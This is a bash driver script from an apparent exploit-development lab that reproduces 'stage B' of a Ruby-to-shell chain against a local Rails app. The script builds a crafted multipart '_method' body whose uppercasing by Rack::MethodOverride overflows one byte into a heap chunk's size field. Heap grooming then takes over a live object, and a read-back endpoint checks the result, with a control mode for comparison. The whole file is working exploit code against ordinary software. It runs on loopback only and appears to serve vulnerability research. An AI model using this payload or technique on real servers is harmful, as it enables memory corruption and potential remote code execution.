#!/bin/bash
# Stage B over HTTP, Rails — driver. Loopback only.
#
# 1. Runs ruby2shell-stageB-rails-setup.sh (idempotent: provisions gems,
#    regenerates lab/build/rails-stageb-app from scratch).
# 2. Boots the app (development mode, WEBrick handler) on
#    127.0.0.1:4548 under the mtrace preload, plain 3.4.12 build.
# 3. POST /trigger — GroomMiddleware (before the default
#    Rack::MethodOverride) builds [S 0x370][V 0x430][W live][dummy
#    0x360]; the multipart `_method` part, ISO-8859-1, N=828 is upcased
#    by the DEFAULT middleware (Rack::MethodOverride) -> one 0x53 byte
#    onto V's size LSB while V is in unsorted; the result alloc walks
#    unsorted and bins V at 0x450. MarkerMiddleware (immediately after
#    MethodOverride) allocates "m"*1080 -> exact-fit take of V.
#    CONTROL mode sends pure 0xDF*828 instead (same buffer sizes, no
#    parity flip, NO overflow).
# 4. GET /mark — readback over the live W object.
#
# Evidence lands in lab/build/evidence/stageB-rails-{1..N,control-N}.{trace,out}
set -u
ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
RB="$ROOT/lab/build/plain/ruby-3.4.12-plain/bin/ruby"
APP="$ROOT/lab/build/rails-stageb-app"
EV="$ROOT/lab/build/evidence"
PORT=4548
RUNS="${1:-5}"
MODE="${2:-run}"   # run|control

bash "$ROOT/lab/repro/ruby2shell-stageB-rails-setup.sh" >/dev/null \
  || { echo "setup failed"; exit 1; }
export PATH="$ROOT/lab/build/plain/ruby-3.4.12-plain/bin:$PATH"

build_body() {  # $1 = attack|control (python emits the bytes)
  python3 - "$1" <<'PY'
import sys
mode = sys.argv[1]
data = (b'\xdf' * 828) if mode == 'control' else (b'a' + b'\xdf' * 827)
out = []
out.append(b'--XB\r\nContent-Disposition: form-data; name="_method"\r\n'
           b'Content-Type: text/plain; charset=ISO-8859-1\r\n\r\n')
out.append(data)
out.append(b'\r\n--XB\r\nContent-Disposition: form-data; name="f"\r\n'
           b'Content-Type: text/plain\r\n\r\nfiller\r\n--XB--\r\n')
sys.stdout.buffer.write(b''.join(out))
PY
}
for i in $(seq 1 "$RUNS"); do
  TAG=$i; [ "$MODE" = control ] && TAG="control-$i"
  TRACE="$EV/stageB-rails-$TAG.trace"; OUT="$EV/stageB-rails-$TAG.out"
  mkdir -p "$EV"

  (
    cd "$APP"
    [ "$MODE" = control ] && export STAGEB_CONTROL=1
    exec env MTRACE_FD=2 LD_PRELOAD="$ROOT/lab/preload/mtrace.so" \
      "$RB" ./bin/rails server -u webrick -p "$PORT" -b 127.0.0.1
  ) > "$TRACE" 2>&1 &
  SRVPID=$!
  for t in $(seq 1 150); do
    curl -s -m 2 "http://127.0.0.1:$PORT/" >/dev/null 2>&1 && break
    sleep 0.3
  done
  if [ "$MODE" = control ]; then B=control; else B=attack; fi
  build_body "$B" > /tmp/stageb-rails-body.bin
  {
    echo "== run $TAG $(date -u +%H:%M:%SZ)"
    echo "-- trigger:"; curl -s -m 20 -X POST "http://127.0.0.1:$PORT/trigger" \
      -H 'Content-Type: multipart/form-data; boundary=XB' \
      --data-binary @/tmp/stageb-rails-body.bin -w 'HTTP %{http_code}\n'
    echo "-- mark:"; curl -s -m 10 "http://127.0.0.1:$PORT/mark"
    echo "-- alive after:"; curl -s -m 5 "http://127.0.0.1:$PORT/mark" || echo "SERVER DEAD"
  } > "$OUT" 2>&1
  kill $SRVPID 2>/dev/null; wait $SRVPID 2>/dev/null
  echo "== $TAG done"; head -8 "$OUT"
done
